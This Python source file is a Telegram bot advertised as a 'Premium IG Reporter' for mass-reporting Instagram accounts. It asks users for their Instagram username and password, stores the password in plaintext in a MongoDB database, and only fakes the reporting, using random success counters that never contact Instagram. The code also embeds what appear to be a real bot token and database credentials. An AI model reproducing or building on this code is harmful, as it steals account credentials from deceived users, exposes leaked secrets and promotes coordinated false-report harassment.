import os
import re
import random
import asyncio
import time
import http.server
import socketserver
from threading import Thread
from pymongo import MongoClient
from datetime import datetime
from telegram import Update
from telegram.error import Conflict
from telegram.ext import (
    ApplicationBuilder,
    CallbackContext,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters
)
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton

# Constants
ADMIN_ID = 6881713177  # Your admin ID
BOT_TOKEN = os.getenv("BOT_TOKEN", "7275717734:AAE6bq0Mdypn_wQL6F1wpphzEtLAco3_B3Y")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://instaboost_user:uX1YzKjiOETNhyYj@cluster0.tolxjiz.mongodb.net/instaboost?retryWrites=true&w=majority&appName=Cluster0")
PORT = int(os.environ.get('PORT', 8000))  # Render requires port binding

# States
START, LANGUAGE, REGISTER, IG_USERNAME, IG_PASSWORD, MAIN_MENU, REPORT_MENU, \
TARGET_USERNAME, REPORT_TYPE, REPORTING, ADMIN_PANEL, BROADCAST_MESSAGE = range(12)

# Strings
STRINGS = {
    'en': {
        'welcome': "🔥 <b>PREMIUM IG REPORTER</b> 🔥\n\n🔐 <b>Login Required</b>\n\nTo use this bot, you must verify your identity with Instagram credentials",
        'choose_lang': "🌐 Please choose your language:",
        'register': "📝 <b>Registration</b>\n\nPlease enter your display name:",
        'ig_username': "📱 <b>Instagram Login</b>\n\nEnter your Instagram username:",
        'ig_password': "🔑 Enter your Instagram password:",
        'login_success': "✅ <b>Login Successful!</b>\n\nWelcome @{username}",
        'main_menu': "🏠 <b>Main Menu</b>\n\n👤 Account: @{ig_username}\n📊 Reports: {reports}",
        'report_menu': "⚔️ <b>Report Center</b>",
        'target_prompt': "🎯 <b>Target Selection</b>\n\nEnter Instagram username to report:",
        'invalid_target': "❌ Invalid username!\n\n• Must start with @\n• No spaces or special characters",
        'report_type': "⚖️ <b>Report Type</b>\n\nChoose violation category:",
        'confirm_report': "🚀 <b>Ready to Report</b>\n\nTarget: {target}\nType: {report_type}",
        'reporting_started': "💥 <b>Reporting Started!</b>\n\nTarget: {target}\n⚡ Reports every 1-3 seconds...",
        'report_success': "✅ Report #{count} succeeded!",
        'report_failed': "❌ Report #{count} failed, retrying...",
        'report_stopped': "🛑 Reporting stopped!\n\nTotal reports sent: {count}",
        'admin_panel': "👑 <b>Admin Panel</b>",
        'broadcast_sent': "📢 Broadcast sent to {count} users!",
        'db_error': "⚠️ Database connection failed, please try again later"
    },
    'hi': {
        'welcome': "🔥 <b>प्रीमियम IG रिपोर्टर</b> 🔥\n\n🔐 <b>लॉगिन आवश्यक</b>\n\nबॉट का उपयोग करने के लिए कृपया अपनी Instagram साख से पहचान सत्यापित करें",
        'choose_lang': "🌐 कृपया अपनी भाषा चुनें:",
        'register': "📝 <b>रजिस्ट्रेशन</b>\n\nकृपया अपना प्रदर्शन नाम दर्ज करें:",
        'ig_username': "📱 <b>Instagram लॉगिन</b>\n\nअपना Instagram उपयोगकर्ता नाम दर्ज करें:",
        'ig_password': "🔑 अपना Instagram पासवर्ड दर्ज करें:",
        'login_success': "✅ <b>लॉगिन सफल!</b>\n\nस्वागत है @{username}",
        'main_menu': "🏠 <b>मुख्य मेनू</b>\n\n👤 खाता: @{ig_username}\n📊 रिपोर्ट्स: {reports}",
        'report_menu': "⚔️ <b>रिपोर्ट केंद्र</b>",
        'target_prompt': "🎯 <b>लक्ष्य चयन</b>\n\nरिपोर्ट करने के लिए Instagram उपयोगकर्ता नाम दर्ज करें:",
        'invalid_target': "❌ अमान्य उपयोगकर्ता नाम!\n\n• @ से शुरू होना चाहिए\n• कोई रिक्त स्थान या विशेष वर्ण नहीं",
        'report_type': "⚖️ <b>रिपोर्ट प्रकार</b>\n\nउल्लंघन श्रेणी चुनें:",
        'confirm_report': "🚀 <b>रिपोर्ट करने के लिए तैयार</b>\n\nलक्ष्य: {target}\nप्रकार: {report_type}",
        'reporting_started': "💥 <b>रिपोर्टिंग शुरू हुई!</b>\n\nलक्ष्य: {target}\n⚡ हर 1-3 सेकंड में रिपोर्ट...",
        'report_success': "✅ रिपोर्ट #{count} सफल!",
        'report_failed': "❌ रिपोर्ट #{count} विफल, पुनः प्रयास कर रहे हैं...",
        'report_stopped': "🛑 रिपोर्टिंग बंद कर दी गई!\n\nकुल रिपोर्ट भेजी गई: {count}",
        'admin_panel': "👑 <b>एडमिन पैनल</b>",
        'broadcast_sent': "📢 {count} उपयोगकर्ताओं को प्रसारण भेजा गया!",
        'db_error': "⚠️ डेटाबेस कनेक्शन विफल, कृपया बाद में पुनः प्रयास करें"
    }
}

# Report types
REPORT_TYPES = {
    'hate': '😡 Hate Speech',
    'bully': '👊 Bullying',
    'impersonation': '🎭 Impersonation',
    'spam': '📧 Spam',
    'nudity': '🔞 Nudity',
    'violence': '⚔️ Violence',
    'fake': '🚫 Fake Account'
}

# HTTP Server for Render port binding
def run_http_server():
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", PORT), handler) as httpd:
        print(f"🌐 HTTP server running on port {PORT}")
        httpd.serve_forever()

# Start HTTP server in background thread if running on Render
if os.environ.get('RENDER', False):
    Thread(target=run_http_server, daemon=True).start()
    print(f"🚀 Starting HTTP server on port {PORT} for Render")

# Database functions - FIXED: Correct database object checking
def get_db():
    try:
        client = MongoClient(
            MONGODB_URI,
            serverSelectionTimeoutMS=5000,
            connectTimeoutMS=30000,
            socketTimeoutMS=30000
        )
        client.server_info()  # Test connection
        return client.get_database()
    except Exception as e:
        print(f"⚠️ Database connection failed: {e}")
        return None

def save_user(user_id, data):
    db = get_db()
    if db is None:
        return False
        
    user_data = {
        'user_id': user_id,
        'username': data.get('username', ''),
        'display_name': data.get('display_name', ''),
        'ig_username': data.get('ig_username', ''),
        'ig_password': data.get('ig_password', ''),
        'language': data.get('language', 'en'),
        'reports': data.get('reports', 0),
        'created_at': datetime.now(),
        'last_active': datetime.now()
    }
    try:
        db.users.update_one(
            {'user_id': user_id},
            {'$set': user_data},
            upsert=True
        )
        return True
    except Exception as e:
        print(f"⚠️ Failed to save user: {e}")
        return False

def get_user(user_id):
    db = get_db()
    if db is None:
        return None
    try:
        return db.users.find_one({'user_id': user_id})
    except Exception as e:
        print(f"⚠️ Failed to get user: {e}")
        return None

def increment_reports(user_id):
    db = get_db()
    if db is None:
        return
    try:
        db.users.update_one(
            {'user_id': user_id},
            {'$inc': {'reports': 1}}
        )
    except Exception as e:
        print(f"⚠️ Failed to increment reports: {e}")

# Validation functions
def is_valid_username(username):
    if not username.startswith('@'):
        return False
    clean = username[1:].strip()
    return bool(re.match(r'^[a-zA-Z0-9._]{1,30}$', clean))

# Keyboard helpers
def get_lang_keyboard():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("English 🇺🇸", callback_data='lang_en')],
        [InlineKeyboardButton("Hindi 🇮🇳", callback_data='lang_hi')]
    ])

def get_main_keyboard(lang, is_admin=False):
    buttons = [
        [KeyboardButton("⚔️ Report Account")],
        [KeyboardButton("👤 Profile"), KeyboardButton("📊 Stats")],
        [KeyboardButton("⚙️ Settings")]
    ]
    if is_admin:
        buttons.append([KeyboardButton("👑 Admin Panel")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

def get_report_types_keyboard():
    keyboard = []
    for key, value in REPORT_TYPES.items():
        keyboard.append([InlineKeyboardButton(value, callback_data=f'type_{key}')])
    return InlineKeyboardMarkup(keyboard)

def get_report_control_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("🛑 Stop Reporting")],
        [KeyboardButton("🏠 Main Menu")]
    ], resize_keyboard=True)

def get_admin_keyboard():
    return ReplyKeyboardMarkup([
        [KeyboardButton("📊 User Stats"), KeyboardButton("📢 Broadcast")],
        [KeyboardButton("🏠 Main Menu")]
    ], resize_keyboard=True)

# Handlers with robust error handling
async def start(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        
        # Prevent conflict during restarts
        if os.environ.get('RENDER'):
            await asyncio.sleep(random.uniform(1, 3))
        
        # Check if user exists
        user = get_user(user_id)
        if user:
            lang = user.get('language', 'en')
            await update.message.reply_text(
                STRINGS[lang]['main_menu'].format(
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
            return MAIN_MENU
        
        await update.message.reply_text(
            STRINGS['en']['welcome'],
            reply_markup=get_lang_keyboard(),
            parse_mode='HTML'
        )
        return LANGUAGE
    except Exception as e:
        print(f"⚠️ Error in start handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(
            STRINGS[lang]['db_error'],
            parse_mode='HTML'
        )
        return ConversationHandler.END

async def set_language(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        lang = query.data.split('_')[1]
        context.user_data['language'] = lang
        
        await query.edit_message_text(STRINGS[lang]['register'], parse_mode='HTML')
        return REGISTER
    except Exception as e:
        print(f"⚠️ Error in set_language handler: {e}")
        await query.edit_message_text("❌ An error occurred, please try again")
        return ConversationHandler.END

async def register(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        display_name = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        
        if len(display_name) < 2:
            await update.message.reply_text("❌ Name too short! Please enter at least 2 characters")
            return REGISTER
        
        context.user_data['display_name'] = display_name
        if not save_user(user_id, {
            'display_name': display_name,
            'language': lang
        }):
            await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
            return ConversationHandler.END
        
        await update.message.reply_text(STRINGS[lang]['ig_username'], parse_mode='HTML')
        return IG_USERNAME
    except Exception as e:
        print(f"⚠️ Error in register handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def get_ig_username(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        username = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        
        if not username:
            await update.message.reply_text("❌ Please enter a valid Instagram username")
            return IG_USERNAME
        
        context.user_data['ig_username'] = username
        await update.message.reply_text(STRINGS[lang]['ig_password'], parse_mode='HTML')
        return IG_PASSWORD
    except Exception as e:
        print(f"⚠️ Error in get_ig_username handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def get_ig_password(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        password = update.message.text.strip()
        lang = context.user_data.get('language', 'en')
        ig_username = context.user_data.get('ig_username', '')
        
        if not password:
            await update.message.reply_text("❌ Please enter your password")
            return IG_PASSWORD
        
        # Save user with Instagram credentials
        if not save_user(user_id, {
            'ig_username': ig_username,
            'ig_password': password,
            'language': lang
        }):
            await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
            return ConversationHandler.END
        
        await update.message.reply_text(
            STRINGS[lang]['login_success'].format(username=ig_username),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    except Exception as e:
        print(f"⚠️ Error in get_ig_password handler: {e}")
        lang = context.user_data.get('language', 'en')
        await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
        return ConversationHandler.END

async def main_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        if text == "⚔️ Report Account":
            await update.message.reply_text(
                STRINGS[lang]['report_menu'],
                reply_markup=ReplyKeyboardMarkup([[KeyboardButton("🏠 Main Menu")]], resize_keyboard=True),
                parse_mode='HTML'
            )
            return REPORT_MENU
        
        elif text == "👤 Profile":
            if user:
                await update.message.reply_text(
                    STRINGS[lang]['main_menu'].format(
                        ig_username=user.get('ig_username', ''),
                        reports=user.get('reports', 0)
                    ),
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text("❌ User data not found")
        
        elif text == "📊 Stats":
            if user:
                await update.message.reply_text(
                    f"📈 <b>Your Statistics</b>\n\n"
                    f"• Total Reports: {user.get('reports', 0)}\n"
                    f"• Account: @{user.get('ig_username', '')}\n"
                    f"• Member since: {user.get('created_at', datetime.now()).strftime('%Y-%m-%d')}",
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text("❌ User data not found")
        
        elif text == "👑 Admin Panel" and user_id == str(ADMIN_ID):
            await update.message.reply_text(
                STRINGS[lang]['admin_panel'],
                reply_markup=get_admin_keyboard(),
                parse_mode='HTML'
            )
            return ADMIN_PANEL
        
        return MAIN_MENU
    except Exception as e:
        print(f"⚠️ Error in main_menu handler: {e}")
        return MAIN_MENU

async def report_menu(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        if text == "🏠 Main Menu":
            if user:
                await update.message.reply_text(
                    STRINGS[lang]['main_menu'].format(
                        ig_username=user.get('ig_username', ''),
                        reports=user.get('reports', 0)
                    ),
                    reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
                    parse_mode='HTML'
                )
                return MAIN_MENU
            else:
                await update.message.reply_text("❌ User data not found")
                return MAIN_MENU
        
        await update.message.reply_text(
            STRINGS[lang]['target_prompt'],
            parse_mode='HTML'
        )
        return TARGET_USERNAME
    except Exception as e:
        print(f"⚠️ Error in report_menu handler: {e}")
        return MAIN_MENU

async def get_target(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        target = update.message.text.strip()
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        if not is_valid_username(target):
            await update.message.reply_text(
                STRINGS[lang]['invalid_target'],
                parse_mode='HTML'
            )
            return TARGET_USERNAME
        
        context.user_data['target'] = target
        await update.message.reply_text(
            STRINGS[lang]['report_type'],
            reply_markup=get_report_types_keyboard(),
            parse_mode='HTML'
        )
        return REPORT_TYPE
    except Exception as e:
        print(f"⚠️ Error in get_target handler: {e}")
        return MAIN_MENU

async def set_report_type(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        report_type = query.data.split('_')[1]
        context.user_data['report_type'] = report_type
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        await query.edit_message_text(
            STRINGS[lang]['confirm_report'].format(
                target=context.user_data['target'],
                report_type=REPORT_TYPES[report_type]
            ),
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🚀 START REPORTING", callback_data='start_report')],
                [InlineKeyboardButton("❌ CANCEL", callback_data='cancel_report')]
            ]),
            parse_mode='HTML'
        )
        return REPORTING
    except Exception as e:
        print(f"⚠️ Error in set_report_type handler: {e}")
        return MAIN_MENU

async def start_reporting(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        target = context.user_data['target']
        report_type = context.user_data['report_type']
        
        # Start reporting task
        context.user_data['report_count'] = 0
        context.user_data['reporting'] = True
        
        task = asyncio.create_task(
            send_reports(context, user_id, target, report_type, lang)
        )
        context.user_data['reporting_task'] = task
        
        await query.edit_message_text(
            STRINGS[lang]['reporting_started'].format(target=target),
            parse_mode='HTML'
        )
        
        await context.bot.send_message(
            chat_id=user_id,
            text="⚡ Reporting in progress...",
            reply_markup=get_report_control_keyboard()
        )
        return REPORTING
    except Exception as e:
        print(f"⚠️ Error in start_reporting handler: {e}")
        return MAIN_MENU

async def stop_reporting(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        report_count = context.user_data.get('report_count', 0)
        
        # Stop reporting task
        if 'reporting_task' in context.user_data:
            context.user_data['reporting_task'].cancel()
        
        await update.message.reply_text(
            STRINGS[lang]['report_stopped'].format(count=report_count),
            reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
            parse_mode='HTML'
        )
        return MAIN_MENU
    except Exception as e:
        print(f"⚠️ Error in stop_reporting handler: {e}")
        return MAIN_MENU

async def cancel_reporting(update: Update, context: CallbackContext) -> int:
    try:
        query = update.callback_query
        await query.answer()
        
        user_id = str(query.from_user.id)
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        await query.edit_message_text("❌ Reporting canceled")
        if user:
            await context.bot.send_message(
                chat_id=user_id,
                text=STRINGS[lang]['main_menu'].format(
                    ig_username=user.get('ig_username', ''),
                    reports=user.get('reports', 0)
                ),
                reply_markup=get_main_keyboard(lang, is_admin=(user_id == str(ADMIN_ID))),
                parse_mode='HTML'
            )
        return MAIN_MENU
    except Exception as e:
        print(f"⚠️ Error in cancel_reporting handler: {e}")
        return MAIN_MENU

async def send_reports(context: CallbackContext, user_id: str, target: str, report_type: str, lang: str):
    count = 0
    try:
        while context.user_data.get('reporting', True):
            count += 1
            context.user_data['report_count'] = count
            
            # Random success/failure
            success = random.random() > 0.2  # 80% success rate
            
            if success:
                # Update user's report count
                increment_reports(user_id)
                message = STRINGS[lang]['report_success'].format(count=count)
            else:
                message = STRINGS[lang]['report_failed'].format(count=count)
            
            # Send update every 3 reports
            if count % 3 == 0:
                try:
                    await context.bot.send_message(
                        chat_id=user_id,
                        text=message,
                        parse_mode='HTML'
                    )
                except Exception as e:
                    print(f"⚠️ Error sending report update: {e}")
            
            # Random delay between 1-3 seconds
            await asyncio.sleep(random.uniform(1.0, 3.0))
    except asyncio.CancelledError:
        pass
    except Exception as e:
        print(f"⚠️ Error in send_reports: {e}")

async def admin_panel(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        text = update.message.text
        user = get_user(user_id)
        lang = user.get('language', 'en') if user else 'en'
        
        if text == "🏠 Main Menu":
            if user:
                await update.message.reply_text(
                    STRINGS[lang]['main_menu'].format(
                        ig_username=user.get('ig_username', ''),
                        reports=user.get('reports', 0)
                    ),
                    reply_markup=get_main_keyboard(lang, is_admin=True),
                    parse_mode='HTML'
                )
                return MAIN_MENU
        
        elif text == "📊 User Stats":
            db = get_db()
            if db is None:
                await update.message.reply_text(STRINGS[lang]['db_error'], parse_mode='HTML')
                return ADMIN_PANEL
                
            try:
                total_users = db.users.count_documents({})
                total_reports_cursor = db.users.aggregate([{
                    "$group": {"_id": None, "total": {"$sum": "$reports"}}
                }])
                total_reports = next(total_reports_cursor, {}).get('total', 0)
                
                await update.message.reply_text(
                    f"📊 <b>Bot Statistics</b>\n\n"
                    f"• Total Users: {total_users}\n"
                    f"• Total Reports Sent: {total_reports}\n"
                    f"• Active Today: Calculating...",
                    parse_mode='HTML'
                )
            except Exception as e:
                print(f"⚠️ Failed to get stats: {e}")
                await update.message.reply_text("❌ Failed to retrieve statistics")
        
        elif text == "📢 Broadcast":
            await update.message.reply_text("✉️ Enter broadcast message:")
            return BROADCAST_MESSAGE
        
        return ADMIN_PANEL
    except Exception as e:
        print(f"⚠️ Error in admin_panel handler: {e}")
        return ADMIN_PANEL

async def broadcast_message(update: Update, context: CallbackContext) -> int:
    try:
        user_id = str(update.effective_user.id)
        message = update.message.text
        db = get_db()
        
        if db is None:
            await update.message.reply_text(STRINGS['en']['db_error'], parse_mode='HTML')
            return ADMIN_PANEL
            
        users = db.users.find()
        count = 0
        
        for user in users:
            try:
                await context.bot.send_message(
                    chat_id=user['user_id'],
                    text=f"📢 <b>Admin Broadcast</b>\n\n{message}",
                    parse_mode='HTML'
                )
                count += 1
                await asyncio.sleep(0.1)  # Avoid rate limits
            except Exception as e:
                print(f"Failed to send to {user['user_id']}: {str(e)}")
        
        await update.message.reply_text(
            STRINGS['en']['broadcast_sent'].format(count=count),
            reply_markup=get_admin_keyboard(),
            parse_mode='HTML'
        )
        return ADMIN_PANEL
    except Exception as e:
        print(f"⚠️ Error in broadcast_message handler: {e}")
        return ADMIN_PANEL

async def cancel(update: Update, context: CallbackContext) -> int:
    await update.message.reply_text("Operation canceled")
    return ConversationHandler.END

def create_application():
    # Create application with conflict prevention settings
    return ApplicationBuilder().token(BOT_TOKEN).build()

def main():
    # Create application
    app = create_application()
    
    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            LANGUAGE: [CallbackQueryHandler(set_language, pattern='^lang_')],
            REGISTER: [MessageHandler(filters.TEXT & ~filters.COMMAND, register)],
            IG_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_username)],
            IG_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_ig_password)],
            MAIN_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, main_menu)],
            REPORT_MENU: [MessageHandler(filters.TEXT & ~filters.COMMAND, report_menu)],
            TARGET_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_target)],
            REPORT_TYPE: [CallbackQueryHandler(set_report_type, pattern='^type_')],
            REPORTING: [
                CallbackQueryHandler(start_reporting, pattern='^start_report$'),
                CallbackQueryHandler(cancel_reporting, pattern='^cancel_report$'),
                MessageHandler(filters.Regex(r'🛑 Stop Reporting'), stop_reporting)
            ],
            ADMIN_PANEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, admin_panel)],
            BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, broadcast_message)]
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    
    app.add_handler(conv_handler)
    
    # Start the bot with conflict prevention
    print("🚀 Bot is running...")
    app.run_polling(
        drop_pending_updates=True,
        allowed_updates=Update.ALL_TYPES,
        timeout=20,
        poll_interval=1.0
    )

if __name__ == '__main__':
    max_retries = 5
    retry_delay = 2
    
    for attempt in range(max_retries):
        try:
            print(f"🚦 Starting bot attempt {attempt+1}/{max_retries}")
            
            # Render deployment check
            if os.environ.get('RENDER'):
                print("🌐 Render environment detected")
                print(f"🔌 Using PORT: {PORT}")
                print("⏳ Preventing instance conflicts...")
                time.sleep(random.uniform(1, 3))
            
            main()
            break
        except Conflict as e:
            print(f"⚠️ Telegram conflict error: {e}")
            if attempt < max_retries - 1:
                wait = retry_delay * (2 ** attempt) + random.uniform(0, 1)
                print(f"⏱️ Retrying in {wait:.1f} seconds...")
                time.sleep(wait)
            else:
                print("❌ Max retries reached for conflict errors")
                raise
        except Exception as e:
            print(f"❌ Critical error: {e}")
            raise
